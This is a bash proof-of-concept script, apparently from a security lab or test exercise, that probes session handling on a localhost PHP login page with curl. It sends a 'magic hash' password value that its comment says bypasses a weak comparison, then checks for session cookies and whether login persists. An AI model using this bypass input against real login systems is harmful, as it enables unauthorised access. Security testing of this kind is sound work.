#!/bin/bash

# POC: Weak Session Management - No Session Tokens, Stateless Authentication
# Demonstrates that the application does not maintain server-side sessions
# and requires re-authentication for every request

TARGET="http://localhost/index.php"
VALID_PASSWORD="0e215962017"  # Known magic hash that bypasses weak comparison

echo "========================================="
echo "POC: Weak Session Management Vulnerability"
echo "========================================="
echo ""

# Test 1: Check for Set-Cookie headers on authentication
echo "[Test 1] Checking for Set-Cookie headers on successful authentication..."
echo "Command: curl -i -X POST $TARGET -d 'password=$VALID_PASSWORD'"
echo ""

RESPONSE=$(curl -i -X POST "$TARGET" -d "password=$VALID_PASSWORD" 2>/dev/null)
RESPONSE_HEADERS=$(echo "$RESPONSE" | head -20)

echo "Response Headers:"
echo "$RESPONSE_HEADERS"
echo ""

# Check for Set-Cookie header
if echo "$RESPONSE_HEADERS" | grep -qi "Set-Cookie"; then
    echo "❌ Test 1 FAILED: Set-Cookie header found (session management implemented)"
    SESSION_FOUND=1
else
    echo "✓ Test 1 PASSED: No Set-Cookie header found (no session management)"
    SESSION_FOUND=0
fi
echo ""

# Test 2: Verify authentication state not persisted (no session cookies)
echo "[Test 2] Testing if authentication persists with stored cookies..."
echo ""

# Create temp files for cookies
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

# First request: authenticate and try to save cookies
echo "First request - Authenticating with password and saving cookies..."
curl -s -c "$COOKIE_JAR" -X POST "$TARGET" -d "password=$VALID_PASSWORD" > /dev/null
echo "Cookies saved to: $COOKIE_JAR"
echo "Cookie contents:"
cat "$COOKIE_JAR"
echo ""

# Second request: try to access without password, using saved cookies
echo "Second request - Attempting access with saved cookies (no password)..."
RESPONSE_WITHOUT_AUTH=$(curl -s -b "$COOKIE_JAR" -X POST "$TARGET" 2>/dev/null)

if echo "$RESPONSE_WITHOUT_AUTH" | grep -qi "login\|password\|incorrect"; then
    echo "✓ Test 2 PASSED: Authentication did NOT persist. Login form returned."
    echo "Conclusion: Cookies are not used for session management"
    AUTH_PERSISTED=0
else
    echo "❌ Test 2 FAILED: Authentication persisted without re-authentication"
    AUTH_PERSISTED=1
fi
echo ""

# Test 3: Demonstrate stateless authentication (re-authentication required)
echo "[Test 3] Demonstrating stateless authentication..."
echo ""

echo "Request A - With password parameter: Shows authenticated content"
RESPONSE_A=$(curl -s -X POST "$TARGET" -d "password=$VALID_PASSWORD" 2>/dev/null)
if echo "$RESPONSE_A" | grep -qi "Welcome Admin"; then
    echo "✓ With password: 'Welcome Admin' displayed"
    AUTHED_A=1
else
    echo "✗ With password: Authentication failed"
    AUTHED_A=0
fi
echo ""

echo "Request B - Without password parameter (using same authenticated state/cookies): Should require re-auth"
RESPONSE_B=$(curl -s -X POST "$TARGET" 2>/dev/null)
if echo "$RESPONSE_B" | grep -qi "login\|password"; then
    echo "✓ Without password: Login form returned (authentication NOT persisted)"
    AUTHED_B=0
else
    echo "✗ Without password: Authenticated content returned (this would indicate session persistence)"
    AUTHED_B=1
fi
echo ""

echo "Request C - With password again: Shows authenticated content"
RESPONSE_C=$(curl -s -X POST "$TARGET" -d "password=$VALID_PASSWORD" 2>/dev/null)
if echo "$RESPONSE_C" | grep -qi "Welcome Admin"; then
    echo "✓ With password again: 'Welcome Admin' displayed"
    AUTHED_C=1
else
    echo "✗ With password again: Authentication failed"
    AUTHED_C=0
fi
echo ""

# Summary
echo "========================================="
echo "SUMMARY - Weak Session Management"
echo "========================================="
echo ""
echo "Findings:"
echo "1. No Set-Cookie headers issued: YES ($([ $SESSION_FOUND -eq 0 ] && echo 'CONFIRMED' || echo 'NOT FOUND'))"
echo "2. Authentication does NOT persist with cookies: YES ($([ $AUTH_PERSISTED -eq 0 ] && echo 'CONFIRMED' || echo 'NOT CONFIRMED'))"
echo "3. Stateless authentication (re-auth required): YES ($([ $AUTHED_B -eq 0 ] && echo 'CONFIRMED' || echo 'NOT CONFIRMED'))"
echo ""

if [ $SESSION_FOUND -eq 0 ] && [ $AUTH_PERSISTED -eq 0 ] && [ $AUTHED_B -eq 0 ]; then
    echo "✓ VULNERABILITY CONFIRMED: Application uses stateless authentication without session management"
    echo "  - Users cannot maintain persistent login sessions"
    echo "  - Authentication credentials must be sent with every request"
    echo "  - No server-side session state is maintained"
    echo "  - No session tokens or secure session cookies are issued"
    exit 0
else
    echo "❌ Could not fully confirm vulnerability"
    exit 1
fi